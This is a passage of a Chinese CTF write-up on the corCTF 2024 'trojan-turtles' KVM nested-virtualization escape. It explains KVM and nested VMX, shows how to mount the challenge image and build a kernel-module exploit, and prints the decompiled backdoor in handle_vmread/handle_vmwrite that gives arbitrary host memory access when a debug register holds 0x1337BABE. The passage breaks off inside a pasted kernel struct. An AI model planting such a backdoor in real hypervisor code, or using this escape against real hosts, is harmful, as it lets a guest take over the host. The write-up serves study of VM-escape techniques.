@@ -1,0 +1,2290 @@
+---
+title: "KVM 逃逸 - 嵌套虚拟化 - corCTF 2024 trojan-turtles 复现"
+date: "2024-08-29 10:25:50 +0800"
+categories:
+  - "CTF and Pwn"
+tags:
+  - "PWN"
+series: "CTF Writeup"
+excerpt: "目录：参考资料；KVM（基于内核的虚拟机）的概念、实现、ioctl 命令、API 文档、编译选项、与 QEMU 配合及工作原理；嵌套虚拟化；嵌套虚拟化系统中的 vmx 指令；qcow2 镜像、上传 exp 与调试；漏洞 diff、相关源码和结构体、漏洞点；利用思路、vmx 初始化、相对地址任意读写、寻找虚拟机 VMCS 偏移、寻找 nest_vmx 以泄露嵌套虚拟机在宿主机上的虚拟地址、获取 phymap 基址。"
+source: "CSDN"
+original_url: "https://blog.csdn.net/llovewuzhengzi/article/details/140787240"
+csdn_article_id: "140787240"
+migrated: true
+---
+
+{% raw %}
+# 参考资料
+[https://zolutal.github.io/corctf-trojan-turtles/](https://zolutal.github.io/corctf-trojan-turtles/)
+[https://eqqie.cn/index.php/archives/1972](https://eqqie.cn/index.php/archives/1972)
+
+本文首发于奇安信攻防社区 [https://forum.butian.net/question/1370](https://forum.butian.net/question/1370)
+# KVM（Kernel-based Virtual Machine）
+
+
+本节介绍 KVM（基于内核的虚拟机）的概念、实现方式，以及它如何与 QEMU（Quick Emulator）配合使用。下面给出详细说明和示例：
+
+### KVM 的概念
+
+KVM 是基于 Linux 内核的虚拟化技术，让 Linux 内核能够充当虚拟机监控器（VMM）或 hypervisor。KVM 的主要目的是提供统一接口，使用户空间程序能够利用硬件虚拟化功能（如 Intel 的 VMX 和 AMD 的 SVM）创建和管理虚拟机。
+
+### KVM 的实现
+
+KVM 通过名为 `/dev/kvm` 的字符设备驱动实现。该驱动提供一系列 ioctl（输入/输出控制）命令，用于管理和控制虚拟机（VM）的状态与行为。
+
+#### ioctl 命令
+
+ioctl 命令是用户空间程序与内核空间之间传递控制信息的通用机制。KVM 设备驱动提供许多 ioctl 命令，用于配置虚拟机状态、设置寄存器值、加载虚拟机内存映射、控制虚拟机执行等。
+
+- **KVM_SET_REGS**：
+  - 该命令用于设置虚拟机的寄存器状态。
+  - 用户空间程序可以通过该命令，将通用寄存器值写入 vcpu 的通用寄存器。
+
+#### KVM API 文档
+
+- **API 文档**：
+  - KVM API 的详细信息可查阅 Linux 内核文档：[https://docs.kernel.org/virt/kvm/api.html](https://docs.kernel.org/virt/kvm/api.html)
+  - 文档详细描述了可用的 ioctl 命令、参数结构，以及如何使用它们控制虚拟机。
+
+### KVM 编译选项
+
+KVM 可以用不同形式集成到 Linux 内核中，具体取决于编译时的选择：
+
+- **内置于内核**：
+  - 如果内核配置中的 `CONFIG_KVM_INTEL` 设为 `y`，KVM 就会被编译进内核镜像。
+  - 这意味着 KVM 成为内核的一部分，无须加载额外模块即可使用。
+
+- **编译为内核模块**：
+  - 如果 `CONFIG_KVM_INTEL` 设为 `m`，KVM 就会被编译为可加载内核模块。
+  - 这意味着可以通过动态加载模块来启用或禁用 KVM 功能，更为灵活。
+
+### QEMU 与 KVM 配合使用
+
+QEMU 是通用的全系统模拟器，可以模拟多种硬件架构。与 KVM 配合使用时，QEMU 可以利用 KVM 提供的硬件加速，提高虚拟机性能。
+
+- **使用 KVM**：
+  - 使用 `--enable-kvm` 参数启动 QEMU 时，QEMU 会调用 KVM API 运行虚拟机。
+  - 这意味着 QEMU 会利用硬件虚拟化功能，而不是完全依靠软件模拟。
+  - 结果是提升虚拟机性能，减少 CPU 开销。
+
+- **不使用 KVM**：
+  - 如果不使用 `--enable-kvm` 参数，QEMU 会通过纯软件模拟运行虚拟机。
+  - 这种模式的性能通常较低，因为 QEMU 需要在用户空间模拟所有硬件细节。
+
+
+### 工作原理
+
+1. **初始化**：KVM 启动时，检查硬件是否支持虚拟化，并初始化必要的数据结构。
+2. **创建虚拟机**：用户空间应用通过系统调用，通知内核创建新的虚拟机实例。
+3. **配置虚拟机**：应用通过一系列系统调用，配置虚拟机硬件（如内存大小、CPU 数量等）并加载操作系统镜像。
+4. **运行虚拟机**：配置完成后，应用即可启动虚拟机。此时 KVM 接管虚拟机操作，确保其正确执行。
+5. **处理特权指令**：虚拟机尝试执行特权指令时，指令会被捕获并交给 KVM，由 KVM 在宿主机上模拟，或直接在硬件上执行（如果硬件支持）。
+
+
+
+
+
+# 嵌套虚拟化（在虚拟机中创建虚拟机）
+
+“处理器现在可以执行 VMX（虚拟化）相关指令”指的是，CPU 已具备执行一系列专用于虚拟化操作的特殊指令的能力。
+
+1. VMX 指令集：
+   - Intel 处理器提供了一组专用于虚拟化的特殊指令，称为 VMX（Virtual Machine Extensions）指令。
+   - 包括 VMXON、VMXOFF、VMLAUNCH、VMRESUME、VMREAD、VMWRITE 等。
+
+2. 这些指令的作用：
+   - 允许操作系统或虚拟机管理器（如 VMware、VirtualBox）创建和管理虚拟机。
+   - 提供硬件级支持，让虚拟化更高效、更安全。
+
+3. 启用前后的区别：
+   - 启用 VMXE 位之前：尝试执行这些 VMX 指令时，处理器会引发异常，通常是无效操作码异常。
+   - 启用 VMXE 位之后：处理器可以正确识别并执行这些指令。
+
+4. 实际示例：
+   假设要在电脑上运行虚拟机：
+   - 启用 VMXE 前：虚拟机软件只能通过纯软件模拟运行虚拟机，效率较低。
+   - 启用 VMXE 后：虚拟机软件可以利用这些硬件指令，大幅提升虚拟机的运行效率。
+
+# 嵌套虚拟化系统中虚拟机执行 vmx 指令（对虚拟机中的虚拟机进行操作）
+[vmx 指令的使用](https://wiki.osdev.org/VMX#VMCS)
+
+1. 初始状态：
+   - L0：宿主机 VMM（Hypervisor）
+   - L1：第一级虚拟机，运行自己的 VMM
+   - L2：第二级虚拟机（可选）
+
+2. L1 执行 VMX 指令：
+
+   a. 指令拦截：
+      - L1 尝试执行 VMX 指令
+      - 硬件检测到这是需要特殊处理的指令
+
+   b. VM Exit 到 L0：
+      - 控制权从 L1 转移到 L0 VMM
+      - L0 VMM 获取 VM Exit 原因的信息
+
+   c. L0 VMM 分析：
+      - 判断此次退出由 VMX 指令引起
+      - 检查 L1 的权限和当前状态
+
+   d. 模拟执行：
+      - L0 VMM 不直接执行该指令
+      - 而是模拟该指令的效果
+
+   e. 虚拟 VMCS 操作：
+      - 如果指令涉及 VMCS 操作，L0 就操作分配给 L1 的虚拟 VMCS
+      - 虚拟 VMCS 是实际 VMCS 的“影子”或模拟
+
+   f. 状态更新：
+      - L0 更新 L1 的虚拟状态，使其看起来像是已经执行了该指令
+
+   g. VM Entry 返回 L1：
+      - L0 完成模拟后，将控制权交还 L1
+      - L1 继续执行，就像直接执行过 VMX 指令一样
+
+3. 特殊情况——L1 创建 L2：
+
+   a. L1 执行 VMLAUNCH/VMRESUME：
+      - 用于启动或恢复 L2 虚拟机
+
+   b. L0 拦截并模拟：
+      - L0 为 L2 创建或配置新的虚拟 VMCS
+      - 设置必要的嵌套虚拟化结构
+
+   c. 实际 VM Entry：
+      - L0 执行真正的 VM Entry，进入 L2
+      - L2 开始执行，并认为自己由 L1 直接管理
+
+4. L2 执行需要 VM Exit 的操作：
+
+   a. 硬件 VM Exit 到 L0：
+      - 控制权直接交给 L0，跳过 L1
+
+   b. L0 判断：
+      - 决定是否需要通知 L1
+      - 如果需要，就模拟从 L2 到 L1 的 VM Exit
+      - 否则，由 L0 自行处理后返回 L2
+
+5. 优化与硬件支持：
+   - 现代处理器提供 VMCS Shadowing 等功能
+   - 这些功能可以减少 VM Exit 次数，提升性能
+
+6. 持续循环：
+   - 这一过程不断重复，处理 L1 和 L2 的各种操作
+
+
+# qcow2 镜像文件 / 上传 exp / 调试
+
+- 安装 QEMU 工具
+```bash
+# 对于 Debian/Ubuntu:
+sudo apt-get install qemu-utils
+
+```
+
+接下来，查看 `.qcow2` 文件的信息：
+
+```bash
+qemu-img info chall.qcow2
+```
+- 挂载后查看和修改文件
+
+```bash
+sudo guestmount -a chall.qcow2 -m /dev/sda /mnt/qcow2
+cd /mnt/qcow2
+```
+![图片](./assets/csdn-140787240/image-001-cf834355ef.png)
+
+```bash
+tree -L 2
+```
+找到这个东西，应该是虚拟机对应的镜像及其文件系统和启动脚本。直接解包虚拟机的文件系统进行查看，将 exp 模块添加进去，再重新打包、启动虚拟机即可。
+![图片](./assets/csdn-140787240/image-002-b51c301f81.png)
+分别安装对应的内核头文件。这里的目标是为对应虚拟机构建内核模块，再加载模块逃逸到宿主机。
+
+```bash
+sudo dpkg -i linux-hwe-5.15-headers-5.15.0-107_5.15.0-107.117~20.04.1_all.deb
+sudo dpkg -i linux-headers-5.15.0-107-generic_5.15.0-107.117~20.04.1_amd64.deb
+ls /usr/lib/modules/5.15.0-107-generic/build
+```
+exp.c 所在目录中的 Makefile——/usr/lib/modules/5.15.0-107-generic/build 目录下一般也有；如果没有，就自己创建一个。
+
+```bash
+
+obj-m += exp.o
+KDIR := /usr/lib/modules/5.15.0-107-generic/build
+PWD := $(shell pwd)
+
+all:
+	make -C $(KDIR) M=$(PWD) modules
+
+clean:
+	make -C $(KDIR) M=$(PWD) clean
+```
+然后执行 make 即可完成构建。
+
+# 漏洞
+虚拟机执行相关 vmx 指令，也就是进行嵌套虚拟化时，这些 vmx 指令会被识别为特殊指令并触发 VMexit，随后由宿主机 VMM 处理。
+## diff
+差异点位于 handle_vmread 和 handle_vmwrite 函数。
+![图片](./assets/csdn-140787240/image-003-7fdadad193.png)
+
+![图片](./assets/csdn-140787240/image-004-bff319e2c6.png)
+ 
+
+```c
+__int64 __fastcall handle_vmwrite(__int64 a1, int a2, int a3, int a4, int a5, int a6){
+{
+………
+………
+ if ( kvm_get_dr(a1, 0LL) == 0x1337BABE )
+  {
+    dr = kvm_get_dr(a1, 1LL);
+    *(_QWORD *)(v7 + 8 * dr) = kvm_get_dr(a1, 2LL);
+  }
+………
+}
+__int64 __fastcall handle_vmread(__int64 a1, int a2, int a3, int a4, int a5, int a6)
+{
+	…………
+  if ( kvm_get_dr(a1, 0LL) == 0x1337BABE )
+  {
+    dr = kvm_get_dr(a1, 1LL);
+    kvm_set_dr(a1, 2LL, *(_QWORD *)(v6 + 8 * dr));
+  }
+  …………………
+}
+
+```
+
+
+```c
+static inline struct vmcs12 *get_shadow_vmcs12(struct kvm_vcpu *vcpu)
+{
+	return to_vmx(vcpu)->nested.cached_shadow_vmcs12;
+}
+
+static __always_inline struct vcpu_vmx *to_vmx(struct kvm_vcpu *vcpu)
+{
+	return container_of(vcpu, struct vcpu_vmx, vcpu);
+}
+
+#define container_of(ptr, type, member) ({				\
+	void *__mptr = (void *)(ptr);					\
+	static_assert(__same_type(*(ptr), ((type *)0)->member) ||	\
+		      __same_type(*(ptr), void),			\
+		      "pointer type mismatch in container_of()");	\
+	((type *)(__mptr - offsetof(type, member))); })
+
+```
+
+![图片](./assets/csdn-140787240/image-005-8777afb0cc.png)
+上面的代码用于检查当前是否处于嵌套虚拟化状态。
+
+1. 客户机模式（Guest Mode）：
+   在嵌套虚拟化中，“guest mode”指虚拟机监控器（VMM）运行在虚拟机（VM）内部的情况。也就是说，虚拟机中还有虚拟机。
+
+2. 嵌套虚拟化的层级：
+   - L0：最底层的硬件与主虚拟机监控器
+   - L1：运行在 L0 上的虚拟机，本身也是 VMM
+   - L2：运行在 L1 虚拟机内部的虚拟机
+
+3. is_guest_mode(vcpu)：
+   该函数检查指定虚拟 CPU（vcpu）是否处于 guest mode。如果是，表示当前正在运行 L2 虚拟机。
+
+4. VMCS（Virtual Machine Control Structure）：
+   VMCS 是 Intel 虚拟化技术中用于控制虚拟机行为的数据结构。
+
+5. vmcs12：
+   在嵌套虚拟化中，vmcs12 表示 L1 VMM 用于管理 L2 虚拟机的 VMCS。
+
+6. 代码说明：
+   - 如果处于 guest mode，即正在运行 L2 虚拟机，就使用 get_shadow_vmcs12(vcpu) 获取影子 VMCS。
+   - 如果不处于 guest mode，则使用 get_vmcs12(vcpu) 获取普通 VMCS12。
+## 相关源码与结构体
+```c
+
+struct nested_vmx {
+	/* Has the level1 guest done vmxon? */
+	bool vmxon;
+	gpa_t vmxon_ptr;
+	bool pml_full;
+
+	/* The guest-physical address of the current VMCS L1 keeps for L2 */
+	gpa_t current_vmptr;
+	/*
+	 * Cache of the guest's VMCS, existing outside of guest memory.
+	 * Loaded from guest memory during VMPTRLD. Flushed to guest
+	 * memory during VMCLEAR and VMPTRLD.
+	 */
+	struct vmcs12 *cached_vmcs12;
+	/*
+	 * Cache of the guest's shadow VMCS, existing outside of guest
+	 * memory. Loaded from guest memory during VM entry. Flushed
+	 * to guest memory during VM exit.
+	 */
+	struct vmcs12 *cached_shadow_vmcs12;
+
+	/*
+	 * GPA to HVA cache for accessing vmcs12->vmcs_link_pointer
+	 */
+	struct gfn_to_hva_cache shadow_vmcs12_cache;
+
+	/*
+	 * GPA to HVA cache for VMCS12
+	 */
+	struct gfn_to_hva_cache vmcs12_cache;
+
+	/*
+	 * Indicates if the shadow vmcs or enlightened vmcs must be updated
+	 * with the data held by struct vmcs12.
+	 */
+	bool need_vmcs12_to_shadow_sync;
+	bool dirty_vmcs12;
+
+	/*
+	 * Indicates whether MSR bitmap for L2 needs to be rebuilt due to
+	 * changes in MSR bitmap for L1 or switching to a different L2. Note,
+	 * this flag can only be used reliably in conjunction with a paravirt L1
+	 * which informs L0 whether any changes to MSR bitmap for L2 were done
+	 * on its side.
+	 */
+	bool force_msr_bitmap_recalc;
+
+	/*
+	 * Indicates lazily loaded guest state has not yet been decached from
+	 * vmcs02.
+	 */
+	bool need_sync_vmcs02_to_vmcs12_rare;
+
+	/*
+	 * vmcs02 has been initialized, i.e. state that is constant for
+	 * vmcs02 has been written to the backing VMCS.  Initialization
+	 * is delayed until L1 actually attempts to run a nested VM.
+	 */
+	bool vmcs02_initialized;
+
+	bool change_vmcs01_virtual_apic_mode;
+	bool reload_vmcs01_apic_access_page;
+	bool update_vmcs01_cpu_dirty_logging;
+	bool update_vmcs01_apicv_status;
+
+	/*
+	 * Enlightened VMCS has been enabled. It does not mean that L1 has to
+	 * use it. However, VMX features available to L1 will be limited based
+	 * on what the enlightened VMCS supports.
+	 */
+	bool enlightened_vmcs_enabled;
+
+	/* L2 must run next, and mustn't decide to exit to L1. */
+	bool nested_run_pending;
+
+	/* Pending MTF VM-exit into L1.  */
+	bool mtf_pending;
+
+	struct loaded_vmcs vmcs02;
+
+	/*
+	 * Guest pages referred to in the vmcs02 with host-physical
+	 * pointers, so we must keep them pinned while L2 runs.
+	 */
+	struct kvm_host_map apic_access_page_map;
+	struct kvm_host_map virtual_apic_map;
+	struct kvm_host_map pi_desc_map;
+
+	struct kvm_host_map msr_bitmap_map;
+
+	struct pi_desc *pi_desc;
+	bool pi_pending;
+	u16 posted_intr_nv;
+
+	struct hrtimer preemption_timer;
+	u64 preemption_timer_deadline;
+	bool has_preemption_timer_deadline;
+	bool preemption_timer_expired;
+
+	/*
+	 * Used to snapshot MSRs that are conditionally loaded on VM-Enter in
+	 * order to propagate the guest's pre-VM-Enter value into vmcs02.  For
+	 * emulation of VMLAUNCH/VMRESUME, the snapshot will be of L1's value.
+	 * For KVM_SET_NESTED_STATE, the snapshot is of L2's value, _if_
+	 * userspace restores MSRs before nested state.  If userspace restores
+	 * MSRs after nested state, the snapshot holds garbage, but KVM can't
+	 * detect that, and the garbage value in vmcs02 will be overwritten by
+	 * MSR restoration in any case.
+	 */
+	u64 pre_vmenter_debugctl;
+	u64 pre_vmenter_bndcfgs;
+
+	/* to migrate it to L1 if L2 writes to L1's CR8 directly */
+	int l1_tpr_threshold;
+
+	u16 vpid02;
+	u16 last_vpid;
+
+	struct nested_vmx_msrs msrs;
+
+	/* SMM related state */
+	struct {
+		/* in VMX operation on SMM entry? */
+		bool vmxon;
+		/* in guest mode on SMM entry? */
+		bool guest_mode;
+	} smm;
+
+#ifdef CONFIG_KVM_HYPERV
+	gpa_t hv_evmcs_vmptr;
+	struct kvm_host_map hv_evmcs_map;
+	struct hv_enlightened_vmcs *hv_evmcs;
+#endif
+};
+
+struct kvm_vcpu {
+	struct kvm *kvm;
+#ifdef CONFIG_PREEMPT_NOTIFIERS
+	struct preempt_notifier preempt_notifier;
+#endif
+	int cpu;
+	int vcpu_id; /* id given by userspace at creation */
+	int vcpu_idx; /* index into kvm->vcpu_array */
+	int ____srcu_idx; /* Don't use this directly.  You've been warned. */
+#ifdef CONFIG_PROVE_RCU
+	int srcu_depth;
+#endif
+	int mode;
+	u64 requests;
+	unsigned long guest_debug;
+
+	struct mutex mutex;
+	struct kvm_run *run;
+
+#ifndef __KVM_HAVE_ARCH_WQP
+	struct rcuwait wait;
+#endif
+	struct pid __rcu *pid;
+	int sigset_active;
+	sigset_t sigset;
+	unsigned int halt_poll_ns;
+	bool valid_wakeup;
+
+#ifdef CONFIG_HAS_IOMEM
+	int mmio_needed;
+	int mmio_read_completed;
+	int mmio_is_write;
+	int mmio_cur_fragment;
+	int mmio_nr_fragments;
+	struct kvm_mmio_fragment mmio_fragments[KVM_MAX_MMIO_FRAGMENTS];
+#endif
+
+#ifdef CONFIG_KVM_ASYNC_PF
+	struct {
+		u32 queued;
+		struct list_head queue;
+		struct list_head done;
+		spinlock_t lock;
+	} async_pf;
+#endif
+
+#ifdef CONFIG_HAVE_KVM_CPU_RELAX_INTERCEPT
+	/*
+	 * Cpu relax intercept or pause loop exit optimization
+	 * in_spin_loop: set when a vcpu does a pause loop exit
+	 *  or cpu relax intercepted.
+	 * dy_eligible: indicates whether vcpu is eligible for directed yield.
+	 */
+	struct {
+		bool in_spin_loop;
+		bool dy_eligible;
+	} spin_loop;
+#endif
+	bool preempted;
+	bool ready;
+	struct kvm_vcpu_arch arch;
+	struct kvm_vcpu_stat stat;
+	char stats_id[KVM_STATS_NAME_SIZE];
+	struct kvm_dirty_ring dirty_ring;
+
+	/*
+	 * The most recently used memslot by this vCPU and the slots generation
+	 * for which it is valid.
+	 * No wraparound protection is needed since generations won't overflow in
+	 * thousands of years, even assuming 1M memslot operations per second.
+	 */
+	struct kvm_memory_slot *last_used_slot;
+	u64 last_used_slot_gen;
+};
+
+
+struct kvm_vcpu_arch {
+	/*
+	 * rip and regs accesses must go through
+	 * kvm_{register,rip}_{read,write} functions.
+	 */
+	unsigned long regs[NR_VCPU_REGS];
+	u32 regs_avail;
+	u32 regs_dirty;
+
+	unsigned long cr0;
+	unsigned long cr0_guest_owned_bits;
+	unsigned long cr2;
+	unsigned long cr3;
+	unsigned long cr4;
+	unsigned long cr4_guest_owned_bits;
+	unsigned long cr4_guest_rsvd_bits;
+	unsigned long cr8;
+	u32 host_pkru;
+	u32 pkru;
+	u32 hflags;
+	u64 efer;
+	u64 apic_base;
+	struct kvm_lapic *apic;    /* kernel irqchip context */
+	bool load_eoi_exitmap_pending;
+	DECLARE_BITMAP(ioapic_handled_vectors, 256);
+	unsigned long apic_attention;
+	int32_t apic_arb_prio;
+	int mp_state;
+	u64 ia32_misc_enable_msr;
+	u64 smbase;
+	u64 smi_count;
+	bool at_instruction_boundary;
+	bool tpr_access_reporting;
+	bool xfd_no_write_intercept;
+	u64 ia32_xss;
+	u64 microcode_version;
+	u64 arch_capabilities;
+	u64 perf_capabilities;
+
+	/*
+	 * Paging state of the vcpu
+	 *
+	 * If the vcpu runs in guest mode with two level paging this still saves
+	 * the paging mode of the l1 guest. This context is always used to
+	 * handle faults.
+	 */
+	struct kvm_mmu *mmu;
+
+	/* Non-nested MMU for L1 */
+	struct kvm_mmu root_mmu;
+
+	/* L1 MMU when running nested */
+	struct kvm_mmu guest_mmu;
+
+	/*
+	 * Paging state of an L2 guest (used for nested npt)
+	 *
+	 * This context will save all necessary information to walk page tables
+	 * of an L2 guest. This context is only initialized for page table
+	 * walking and not for faulting since we never handle l2 page faults on
+	 * the host.
+	 */
+	struct kvm_mmu nested_mmu;
+
+	/*
+	 * Pointer to the mmu context currently used for
+	 * gva_to_gpa translations.
+	 */
+	struct kvm_mmu *walk_mmu;
+
+	struct kvm_mmu_memory_cache mmu_pte_list_desc_cache;
+	struct kvm_mmu_memory_cache mmu_shadow_page_cache;
+	struct kvm_mmu_memory_cache mmu_shadowed_info_cache;
+	struct kvm_mmu_memory_cache mmu_page_header_cache;
+
+	/*
+	 * QEMU userspace and the guest each have their own FPU state.
+	 * In vcpu_run, we switch between the user and guest FPU contexts.
+	 * While running a VCPU, the VCPU thread will have the guest FPU
+	 * context.
+	 *
+	 * Note that while the PKRU state lives inside the fpu registers,
+	 * it is switched out separately at VMENTER and VMEXIT time. The
+	 * "guest_fpstate" state here contains the guest FPU context, with the
+	 * host PRKU bits.
+	 */
+	struct fpu_guest guest_fpu;
+
+	u64 xcr0;
+	u64 guest_supported_xcr0;
+
+	struct kvm_pio_request pio;
+	void *pio_data;
+	void *sev_pio_data;
+	unsigned sev_pio_count;
+
+	u8 event_exit_inst_len;
+
+	bool exception_from_userspace;
+
+	/* Exceptions to be injected to the guest. */
+	struct kvm_queued_exception exception;
+	/* Exception VM-Exits to be synthesized to L1. */
+	struct kvm_queued_exception exception_vmexit;
+
+	struct kvm_queued_interrupt {
+		bool injected;
+		bool soft;
+		u8 nr;
+	} interrupt;
+
+	int halt_request; /* real mode on Intel only */
+
+	int cpuid_nent;
+	struct kvm_cpuid_entry2 *cpuid_entries;
+	struct kvm_hypervisor_cpuid kvm_cpuid;
+	bool is_amd_compatible;
+
+	/*
+	 * FIXME: Drop this macro and use KVM_NR_GOVERNED_FEATURES directly
+	 * when "struct kvm_vcpu_arch" is no longer defined in an
+	 * arch/x86/include/asm header.  The max is mostly arbitrary, i.e.
+	 * can be increased as necessary.
+	 */
+#define KVM_MAX_NR_GOVERNED_FEATURES BITS_PER_LONG
+
+	/*
+	 * Track whether or not the guest is allowed to use features that are
+	 * governed by KVM, where "governed" means KVM needs to manage state
+	 * and/or explicitly enable the feature in hardware.  Typically, but
+	 * not always, governed features can be used by the guest if and only
+	 * if both KVM and userspace want to expose the feature to the guest.
+	 */
+	struct {
+		DECLARE_BITMAP(enabled, KVM_MAX_NR_GOVERNED_FEATURES);
+	} governed_features;
+
+	u64 reserved_gpa_bits;
+	int maxphyaddr;
+
+	/* emulate context */
+
+	struct x86_emulate_ctxt *emulate_ctxt;
+	bool emulate_regs_need_sync_to_vcpu;
+	bool emulate_regs_need_sync_from_vcpu;
+	int (*complete_userspace_io)(struct kvm_vcpu *vcpu);
+
+	gpa_t time;
+	struct pvclock_vcpu_time_info hv_clock;
+	unsigned int hw_tsc_khz;
+	struct gfn_to_pfn_cache pv_time;
+	/* set guest stopped flag in pvclock flags field */
+	bool pvclock_set_guest_stopped_request;
+
+	struct {
+		u8 preempted;
+		u64 msr_val;
+		u64 last_steal;
+		struct gfn_to_hva_cache cache;
+	} st;
+
+	u64 l1_tsc_offset;
+	u64 tsc_offset; /* current tsc offset */
+	u64 last_guest_tsc;
+	u64 last_host_tsc;
+	u64 tsc_offset_adjustment;
+	u64 this_tsc_nsec;
+	u64 this_tsc_write;
+	u64 this_tsc_generation;
+	bool tsc_catchup;
+	bool tsc_always_catchup;
+	s8 virtual_tsc_shift;
+	u32 virtual_tsc_mult;
+	u32 virtual_tsc_khz;
+	s64 ia32_tsc_adjust_msr;
+	u64 msr_ia32_power_ctl;
+	u64 l1_tsc_scaling_ratio;
+	u64 tsc_scaling_ratio; /* current scaling ratio */
+
+	atomic_t nmi_queued;  /* unprocessed asynchronous NMIs */
+	/* Number of NMIs pending injection, not including hardware vNMIs. */
+	unsigned int nmi_pending;
+	bool nmi_injected;    /* Trying to inject an NMI this entry */
+	bool smi_pending;    /* SMI queued after currently running handler */
+	u8 handling_intr_from_guest;
+
+	struct kvm_mtrr mtrr_state;
+	u64 pat;
+
+	unsigned switch_db_regs;
+	unsigned long db[KVM_NR_DB_REGS];    //  #define KVM_NR_DB_REGS	4
+	unsigned long dr6;
+	unsigned long dr7;
+	unsigned long eff_db[KVM_NR_DB_REGS];
+	unsigned long guest_debug_dr7;
+	u64 msr_platform_info;
+	u64 msr_misc_features_enables;
+
+	u64 mcg_cap;
+	u64 mcg_status;
+	u64 mcg_ctl;
+	u64 mcg_ext_ctl;
+	u64 *mce_banks;
+	u64 *mci_ctl2_banks;
+
+	/* Cache MMIO info */
+	u64 mmio_gva;
+	unsigned mmio_access;
+	gfn_t mmio_gfn;
+	u64 mmio_gen;
+
+	struct kvm_pmu pmu;
+
+	/* used for guest single stepping over the given code position */
+	unsigned long singlestep_rip;
+
+#ifdef CONFIG_KVM_HYPERV
+	bool hyperv_enabled;
+	struct kvm_vcpu_hv *hyperv;
+#endif
+#ifdef CONFIG_KVM_XEN
+	struct kvm_vcpu_xen xen;
+#endif
+	cpumask_var_t wbinvd_dirty_mask;
+
+	unsigned long last_retry_eip;
+	unsigned long last_retry_addr;
+
+	struct {
+		bool halted;
+		gfn_t gfns[ASYNC_PF_PER_VCPU];
+		struct gfn_to_hva_cache data;
+		u64 msr_en_val; /* MSR_KVM_ASYNC_PF_EN */
+		u64 msr_int_val; /* MSR_KVM_ASYNC_PF_INT */
+		u16 vec;
+		u32 id;
+		bool send_user_only;
+		u32 host_apf_flags;
+		bool delivery_as_pf_vmexit;
+		bool pageready_pending;
+	} apf;
+
+	/* OSVW MSRs (AMD only) */
+	struct {
+		u64 length;
+		u64 status;
+	} osvw;
+
+	struct {
+		u64 msr_val;
+		struct gfn_to_hva_cache data;
+	} pv_eoi;
+
+	u64 msr_kvm_poll_control;
+
+	/* set at EPT violation at this point */
+	unsigned long exit_qualification;
+
+	/* pv related host specific info */
+	struct {
+		bool pv_unhalted;
+	} pv;
+
+	int pending_ioapic_eoi;
+	int pending_external_vector;
+
+	/* be preempted when it's in kernel-mode(cpl=0) */
+	bool preempted_in_kernel;
+
+	/* Flush the L1 Data cache for L1TF mitigation on VMENTER */
+	bool l1tf_flush_l1d;
+
+	/* Host CPU on which VM-entry was most recently attempted */
+	int last_vmentry_cpu;
+
+	/* AMD MSRC001_0015 Hardware Configuration */
+	u64 msr_hwcr;
+
+	/* pv related cpuid info */
+	struct {
+		/*
+		 * value of the eax register in the KVM_CPUID_FEATURES CPUID
+		 * leaf.
+		 */
+		u32 features;
+
+		/*
+		 * indicates whether pv emulation should be disabled if features
+		 * are not present in the guest's cpuid
+		 */
+		bool enforce;
+	} pv_cpuid;
+
+	/* Protected Guests */
+	bool guest_state_protected;
+
+	/*
+	 * Set when PDPTS were loaded directly by the userspace without
+	 * reading the guest memory
+	 */
+	bool pdptrs_from_userspace;
+
+#if IS_ENABLED(CONFIG_HYPERV)
+	hpa_t hv_root_tdp;
+#endif
+};
+
+
+#define HF_GUEST_MASK		(1 << 0) /* VCPU is in guest-mode */
+
+static inline bool is_guest_mode(struct kvm_vcpu *vcpu)
+{
+	return vcpu->arch.hflags & HF_GUEST_MASK;
+}
+
+struct __packed vmcs12 {
+	/* According to the Intel spec, a VMCS region must start with the
+	 * following two fields. Then follow implementation-specific data.
+	 */
+	struct vmcs_hdr hdr;
+	u32 abort;
+
+	u32 launch_state; /* set to 0 by VMCLEAR, to 1 by VMLAUNCH */
+	u32 padding[7]; /* room for future expansion */
+
+	u64 io_bitmap_a;
+	u64 io_bitmap_b;
+	u64 msr_bitmap;
+	u64 vm_exit_msr_store_addr;
+	u64 vm_exit_msr_load_addr;
+	u64 vm_entry_msr_load_addr;
+	u64 tsc_offset;
+	u64 virtual_apic_page_addr;
+	u64 apic_access_addr;
+	u64 posted_intr_desc_addr;
+	u64 ept_pointer;
+	u64 eoi_exit_bitmap0;
+	u64 eoi_exit_bitmap1;
+	u64 eoi_exit_bitmap2;
+	u64 eoi_exit_bitmap3;
+	u64 xss_exit_bitmap;
+	u64 guest_physical_address;
+	u64 vmcs_link_pointer;
+	u64 guest_ia32_debugctl;
+	u64 guest_ia32_pat;
+	u64 guest_ia32_efer;
+	u64 guest_ia32_perf_global_ctrl;
+	u64 guest_pdptr0;
+	u64 guest_pdptr1;
+	u64 guest_pdptr2;
+	u64 guest_pdptr3;
+	u64 guest_bndcfgs;
+	u64 host_ia32_pat;
+	u64 host_ia32_efer;
+	u64 host_ia32_perf_global_ctrl;
+	u64 vmread_bitmap;
+	u64 vmwrite_bitmap;
+	u64 vm_function_control;
+	u64 eptp_list_address;
+	u64 pml_address;
+	u64 encls_exiting_bitmap;
+	u64 tsc_multiplier;
+	u64 padding64[1]; /* room for future expansion */
+	/*
+	 * To allow migration of L1 (complete with its L2 guests) between
+	 * machines of different natural widths (32 or 64 bit), we cannot have
+	 * unsigned long fields with no explicit size. We use u64 (aliased
+	 * natural_width) instead. Luckily, x86 is little-endian.
+	 */
+	natural_width cr0_guest_host_mask;
+	natural_width cr4_guest_host_mask;
+	natural_width cr0_read_shadow;
+	natural_width cr4_read_shadow;
+	natural_width dead_space[4]; /* Last remnants of cr3_target_value[0-3]. */
+	natural_width exit_qualification;
+	natural_width guest_linear_address;
+	natural_width guest_cr0;
+	natural_width guest_cr3;
+	natural_width guest_cr4;
+	natural_width guest_es_base;
+	natural_width guest_cs_base;
+	natural_width guest_ss_base;
+	natural_width guest_ds_base;
+	natural_width guest_fs_base;
+	natural_width guest_gs_base;
+	natural_width guest_ldtr_base;
+	natural_width guest_tr_base;
+	natural_width guest_gdtr_base;
+	natural_width guest_idtr_base;
+	natural_width guest_dr7;
+	natural_width guest_rsp;
+	natural_width guest_rip;
+	natural_width guest_rflags;
+	natural_width guest_pending_dbg_exceptions;
+	natural_width guest_sysenter_esp;
+	natural_width guest_sysenter_eip;
+	natural_width host_cr0;
+	natural_width host_cr3;
+	natural_width host_cr4;
+	natural_width host_fs_base;
+	natural_width host_gs_base;
+	natural_width host_tr_base;
+	natural_width host_gdtr_base;
+	natural_width host_idtr_base;
+	natural_width host_ia32_sysenter_esp;
